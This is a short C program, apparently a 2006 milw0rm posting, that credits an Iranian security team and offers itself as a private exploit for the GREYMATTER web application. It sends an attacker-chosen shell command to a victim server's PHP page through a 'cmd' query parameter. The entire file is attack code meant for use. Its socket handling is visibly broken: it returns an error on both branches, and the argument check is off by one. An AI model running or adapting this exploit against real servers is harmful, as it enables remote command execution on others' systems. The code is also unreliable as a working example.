#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#define RETCONNERR            4                        // Connection error
#define RETSOCKERR            3                        // Return for socket error
#define RETRESVERR            2                        // Error code for cannot resolve host
#define RETOK                 1                        // Return OK
#pragma comment(lib,"wsock32")
#define portnum 80
int info(char *ls1);
int ConnectWithString(char *hostname,char *string);
int main(int argc,char **argv){
    char buff[512]="";
    char get[1024]="";
    if(argc<3)
        {
            info(argv[0]);
            return 0;
        }
    strcpy(buff,argv[2]);
    strcat(buff,"?cmd=");
    strcat(buff,argv[3]);
    strcpy(get,"GET ");
    strcat(get,buff);
    strcat(get," HTTP/1.1");
    printf("%s\n",get);
    ConnectWithString(argv[1],get);
    return 0;
}
int ConnectWithString(char *hostname,char *string)
{
    // Socket handle
    WSADATA wsda;

    // Socket file descriptor
    int sockfd;

    // host entrie
    struct hostent *h;

    // Server struct
    struct sockaddr_in server;

    // Return value
    int ret;

    // Initialize socket
    WSAStartup(0x0101, &wsda);

    // Open a socket
    // Create tcp socket
        if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)
            return RETSOCKERR;

    // Cannot create socket if anything fails
    else
        return RETSOCKERR;

    // Resolve host
    if((h=gethostbyname(hostname)) == NULL)
            return RETRESVERR;

    // Init server struct
    server.sin_addr=*((struct in_addr*)h->h_addr);
    server.sin_port=htons(portnum);
    server.sin_family=AF_INET;

    // Connect with server
    if(connect(sockfd, (struct sockaddr*)&server, sizeof(struct sockaddr)) == -1)
        return RETCONNERR;

    // Send string
    ret = send(sockfd, string, strlen(string), 0);

    // Check for socket error
    if(ret == SOCKET_ERROR)
        return RETSOCKERR;

    // Cleanup socket
    WSACleanup();

    closesocket(sockfd);

    // Everything OK

    return RETOK;
}
int info(char *ls1){
    printf("******************************************************************\n");
    printf("*          GREYMATTER Exploit  private version                   *\n");
    printf("*         Exploit By:No_Face_King Bug By:syst3m_f4ult            *\n");
    printf("*    www.crouz.com Great iranian security team                   *\n");
    printf("*      Usage: %s VictimIP  GREYMATTER Path  command  *\n",ls1);
    printf("*   e.g: %s 192.168.0.1  /00000008.php  uname -a     *\n",ls1);
    printf("******************************************************************\n");
    return 0;
}

// milw0rm.com [2006-03-28]
